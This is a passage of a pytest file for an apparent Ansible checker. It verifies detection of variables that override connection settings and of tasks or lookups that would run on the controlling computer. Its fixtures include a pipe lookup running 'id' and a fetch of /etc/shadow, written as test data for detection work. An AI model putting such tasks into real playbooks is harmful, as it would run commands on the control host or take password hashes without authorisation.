        "roles/one/tasks/main.yml: t: a fact of a templated name, \"{{ 'ansible_ssh_' ~ 'common_args' }}\"",
    ),
    "a register": (_in_one({**PING, "register": NAME}), f"roles/one/tasks/main.yml: t: {NAME}"),
    "a loop's variable": (
        _in_one({**PING, "loop": [1], "loop_control": {"loop_var": NAME}}),
        f"roles/one/tasks/main.yml: t: loop_control: {NAME}",
    ),
    "a loop's index": (
        _in_one({**PING, "loop": [1], "loop_control": {"index_var": NAME}}),
        f"roles/one/tasks/main.yml: t: loop_control: {NAME}",
    ),
    "an include's apply": (
        {
            **_in_one({"name": "t", "include_tasks": {"file": "more.yml", "apply": {"vars": {NAME: LOOSE}}}}),
            "roles/one/tasks/more.yml": [PING],
        },
        f"roles/one/tasks/main.yml: t: its apply's vars: {NAME}",
    ),
    "add_host of the host itself": (
        _in_one({"name": "t", "ansible.builtin.add_host": {"name": "{{ inventory_hostname }}", NAME: LOOSE}}),
        f"roles/one/tasks/main.yml: t: add_host: {NAME}",
    ),
    "an include of variables": (
        _in_one({"name": "t", "ansible.builtin.include_vars": "x.yml"}),
        "roles/one/tasks/main.yml: t: an include of variables, {'_raw_params': 'x.yml'}",
    ),
}


@pytest.mark.parametrize("road", sorted(VARIABLE_ROADS))
def test_a_variable_that_would_outrank_the_connection_is_found_wherever_it_is_set(tmp_path: Path, road: str) -> None:
    changes, said = VARIABLE_ROADS[road]
    assert setting_connection_variables(_planted(tmp_path, changes), tmp_path) == [said]


# Each road to this computer, and what the fourth test says of it.
COPY = {"src": "x", "dest": "/tmp/y"}
PIPE = "{{ lookup('ansible.builtin.pipe', 'id') }}"
TEMPLATE_TASK = {"name": "t", "ansible.builtin.template": {"src": "x.j2", "dest": "/x"}}
COMPUTER_ROADS: dict[str, tuple[dict[str, object], str]] = {
    "delegate_to with copy": (
        _in_one({"name": "t", "ansible.builtin.copy": COPY, "delegate_to": "localhost"}) | ROLE_FILE,
        "roles/one/tasks/main.yml: t: delegate_to",
    ),
    "local_action with copy": (
        _in_one({"name": "t", "local_action": {"module": "ansible.builtin.copy", **COPY}}) | ROLE_FILE,
        "roles/one/tasks/main.yml: t: local_action",
    ),
    "a group_by": (
        _in_one({"name": "t", "ansible.builtin.group_by": {"key": "x"}}),
        "roles/one/tasks/main.yml: t: ansible.builtin.group_by, a group joined after the play's check of the"
        " connection",
    ),
    "an add_host into a group": (
        _in_one({"name": "t", "add_host": {"name": "alpha", "groups": "x"}}),
        "roles/one/tasks/main.yml: t: add_host, a group joined after the play's check of the connection",
    ),
    "a lookup in a role's argument specs": (
        {"roles/one/meta/argument_specs.yml": {"argument_specs": {"main": {"short_description": PIPE}}}},
        f"roles/one/meta/argument_specs.yml: a lookup LOOKUPS does not list, run here: {PIPE!r}",
    ),
    "a lookup in a role's argument specs as JSON": (
        {"roles/one/meta/argument_specs.json": '{"argument_specs": {"main": {"short_description": "' + PIPE + '"}}}'},
        f"roles/one/meta/argument_specs.json: a lookup LOOKUPS does not list, run here: {PIPE!r}",
    ),
    "a task's connection": (_in_one({**PING, "connection": "local"}), "roles/one/tasks/main.yml: t: connection"),
    "a block's delegate_to": (
        _in_one({"name": "b", "block": [PING], "delegate_to": "localhost"}),
        "roles/one/tasks/main.yml: b: delegate_to",
    ),
    "the play's connection": (
        {"playbooks/system.yml": _with(connection="local")},
        "playbooks/system.yml: the play's connection",
    ),
    "a role entry's connection": (
        {"playbooks/system.yml": _with(roles=[{"role": "one", "connection": "local"}])},
        "playbooks/system.yml: a role entry's connection",
    ),
    "a meta dependency's delegate_to": (
        {
            "roles/one/meta/main.yml": {"dependencies": [{"role": "two", "delegate_to": "localhost"}]},
            **_role_two(main=[PING]),
        },
        "roles/one/meta/main.yml: a role entry's delegate_to",
    ),
    "an include's apply": (
        {
            **_in_one({"name": "t", "include_tasks": {"file": "more.yml", "apply": {"delegate_to": "localhost"}}}),
            "roles/one/tasks/more.yml": [PING],
        },
        "roles/one/tasks/main.yml: t: its apply's delegate_to",
    ),
    "a fetch": (
        _in_one({"name": "t", "ansible.builtin.fetch": {"src": "/etc/shadow", "dest": "/tmp/x"}}),
        "roles/one/tasks/main.yml: t: ansible.builtin.fetch, which writes on this computer",
    ),
    "a play over this computer": (
        {"playbooks/system.yml": _with(hosts="localhost")},
        "playbooks/system.yml: a play over 'localhost', where layer 1's inventory is all",
    ),
    "a with_ loop": (
        _in_one({**PING, "with_pipe": ["id"]}),
        "roles/one/tasks/main.yml: t: with_pipe, a lookup run here: loop over it instead",
    ),
    "a pipe lookup in a role": (
        _in_one({"name": "t", "ansible.builtin.debug": {"msg": PIPE}}),
        f"roles/one/tasks/main.yml: a lookup LOOKUPS does not list, run here: {PIPE!r}",
    ),
    "a query in a condition": (
        _in_one({**PING, "when": "query('ansible.builtin.pipe', 'id')"}),
        "roles/one/tasks/main.yml: a lookup LOOKUPS does not list, run here: \"query('ansible.builtin.pipe', 'id')\"",
    ),
    "a lookup in a role's defaults": (
        {"roles/one/defaults/main.yml": {"one_x": PIPE}},
        f"roles/one/defaults/main.yml: a lookup LOOKUPS does not list, run here: {PIPE!r}",
    ),
    "a lookup in a template": (
        {**_in_one(TEMPLATE_TASK), "roles/one/templates/x.j2": f"{PIPE}\n"},
        "roles/one/templates/x.j2: a lookup in a template",
    ),
}


@pytest.mark.parametrize("road", sorted(COMPUTER_ROADS))
def test_what_would_run_or_write_on_this_computer_is_found(tmp_path: Path, road: str) -> None:
    changes, said = COMPUTER_ROADS[road]
    assert reaching_this_computer(_planted(tmp_path, changes), tmp_path, lookups={}) == [said]


def test_a_lookup_is_held_to_its_file_and_whole_string(tmp_path: Path) -> None:
    listed = {("roles/one/tasks/main.yml", PIPE): "a read"}
    play = _planted(tmp_path, _in_one({"name": "t", "ansible.builtin.debug": {"msg": PIPE}}))
    assert reaching_this_computer(play, tmp_path, lookups=listed) == []
    # Listed, and no longer there: take it out.
    play = _planted(tmp_path, _in_one(PING))
    assert reaching_this_computer(play, tmp_path, lookups=listed) == [
        f"roles/one/tasks/main.yml: in LOOKUPS, and no longer there: {PIPE!r}"
    ]
    # The same lookup in another string, or another file, is another.
    play = _planted(tmp_path, _in_one({"name": "t", "ansible.builtin.debug": {"msg": f"x {PIPE}"}}))
    assert len(reaching_this_computer(play, tmp_path, lookups=listed)) == 2
